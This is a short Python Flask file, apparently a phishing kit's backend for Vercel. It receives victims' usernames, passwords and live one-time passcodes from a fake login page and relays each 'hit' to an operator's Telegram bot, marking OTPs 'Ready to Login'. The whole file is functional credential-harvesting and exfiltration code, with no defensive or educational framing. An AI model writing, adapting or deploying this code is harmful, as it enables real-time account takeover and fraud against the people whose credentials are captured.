from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Dashboard Settings se data lena
TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_request():
    try:
        data = request.get_json(force=True)
        user = data.get('u')
        dtype = data.get('t')
        
        msg = f"🛰 **NEW HIT CAPTURED**\n\n👤 User: `{user}`\n"
        
        if dtype == 'OTP':
            msg += f"🔢 **LIVE OTP:** `{data.get('o')}`\n✅ Status: Ready to Login"
        else:
            msg += f"🔑 **Pass:** `{data.get('p')}`\n📊 **Stage:** {dtype}"

        # Telegram Send
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Vercel requirements
def handler(req, res):
    return app(req, res)
  
